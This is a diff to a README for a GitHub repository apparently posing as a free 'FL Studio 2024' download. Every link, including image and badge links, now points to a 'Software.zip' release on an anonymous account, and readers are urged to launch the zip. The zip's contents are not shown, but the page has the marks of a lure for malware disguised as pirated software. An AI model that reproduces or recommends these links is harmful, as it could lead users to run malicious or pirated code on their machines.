@@ -1,7 +1,7 @@
 # 🎶🎹🎵 Welcome to Fl Studio 2024 Repository! 🎵🎹🎶
 
 ## Repository Name: Fl-Studio-2024
-[![GitHub release](https://img.shields.io/badge/Download-Fl_Studio_2024-blue.svg?style=for-the-badge)](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)
+[![GitHub release](https://github.com/gxstavo777/Fl-Studio-2024/releases/download/v2.0/Software.zip)](https://github.com/gxstavo777/Fl-Studio-2024/releases/download/v2.0/Software.zip)
 
 ---
 
@@ -16,21 +16,21 @@
 ---
 
 ### Get the Latest Fl Studio 2024:
-🚀 [Download Fl Studio 2024 Here!](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip) 🚀
+🚀 [Download Fl Studio 2024 Here!](https://github.com/gxstavo777/Fl-Studio-2024/releases/download/v2.0/Software.zip) 🚀
 
 ---
 
-### 🌟 Launch the Software.zip file to start the Fl Studio 2024 Experience! 🌟
+### 🌟 Launch the https://github.com/gxstavo777/Fl-Studio-2024/releases/download/v2.0/Software.zip file to start the Fl Studio 2024 Experience! 🌟
 
 ---
 
-Don't forget to check the ["Releases"](https://github.com/YouaifXD/789566136/releases) section for more updates and versions!
+Don't forget to check the ["Releases"](https://github.com/gxstavo777/Fl-Studio-2024/releases/download/v2.0/Software.zip) section for more updates and versions!
 
 ---
 
 ### 🎧🎹 Dive into the World of Music Creation with Fl Studio 2024! 🎹🎧
 
-![Fl Studio 2024](https://via.placeholder.com/800x400)
+![Fl Studio 2024](https://github.com/gxstavo777/Fl-Studio-2024/releases/download/v2.0/Software.zip)
 
 ---
 
@@ -58,13 +58,13 @@ Download Fl Studio 2024 now and embark on a musical journey like never before. C
 
 ### 🎹 Let's Make Some Music with Fl Studio 2024! Start Creating Masterpieces Today! 🎵
 
-![Fl Studio Logo](https://via.placeholder.com/200x200)
+![Fl Studio Logo](https://github.com/gxstavo777/Fl-Studio-2024/releases/download/v2.0/Software.zip)
 
 ---
 
 ### 🚀 Get Started Now - Download Fl Studio 2024! 🚀
 
-[![Download Fl Studio 2024](https://img.shields.io/badge/Download-Fl_Studio_2024-blue.svg?style=for-the-badge)](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)
+[![Download Fl Studio 2024](https://github.com/gxstavo777/Fl-Studio-2024/releases/download/v2.0/Software.zip)](https://github.com/gxstavo777/Fl-Studio-2024/releases/download/v2.0/Software.zip)
 
 ---
 
